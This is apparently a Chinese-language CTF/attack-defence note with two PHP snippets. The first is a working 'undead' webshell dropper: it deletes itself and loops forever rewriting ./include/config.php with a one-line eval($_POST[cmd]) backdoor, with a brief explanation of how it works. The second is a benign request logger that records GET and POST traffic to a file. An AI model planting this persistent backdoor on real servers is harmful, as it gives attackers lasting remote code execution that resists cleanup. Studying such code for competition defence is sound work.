## 不死木马

首先贴代码，然后再分析

```php
<?php
    set_time_limit(0);//程序允许执行的秒数，其中将秒数设为0表示持续运行
    ignore_user_abort(True);//设置客户端断开后，自动执行
    unlink(__FILE__);
    $file = "./include/config.php";
    $dir = "./include/";
    while(1){
        if(!is_dir($dir)){
            mkdir ($dir,0777,true);
        }
        //if(!file_exists($file)){
        @file_put_contents($file,"<?php eval(\$_POST[cmd]);?>");//不转义的时候，会把POST执行
        //system("chmod 777 ./config");
        //}
        

    }
?>
```

原理就是，程序运行后，用`unlink(__FILE__);`来删除自身，并且判断指定目录是否存在，如果不存在则创建目录，如果存在的话，则写入`file_put_contents`webshell文件，这是最简单的一种不死木马的利用了，但是可以用禁用攻击者访问ip的方式的防御

nealwe师傅告诉我了另一种不死木马的实现方式，通过php之前通信交互来读取靶机本地的flag后发送到攻击机

## Web访问记录

```php
<?php
date_default_timezone_set('Asia/Shanghai');
$ip = $_SERVER["REMOTE_ADDR"];//记录访问者的ip
$filename = $_SERVER["PHP_SELF"];//访问者要请求的文件名
$parameter = $_SERVER["QUERY_STRING"];//访问者要请求的参数
$postname = file_get_contents("php://input");
$time = date('Y-m-d H:i:s',time());//访问时间
$logadd = '来访时间:'.$time.'-->'.'访问链接'.'http://'.$ip.$filename.'?'.$parameter." post:".$postname."\r\n";

$fh = fopen("log.txt","a");
fwrite($fh,$logadd);
fclose($fh);
?>
```

在使用时，需写个脚本将所有的页面

`require_once('request_log.php');`即可

先阶段能够抓取到get，但是抓取不到POST包，还需要增加ua头，防止ua头被利用。

增加`$postname = file_get_contents("php://input");`后成功抓取到post包
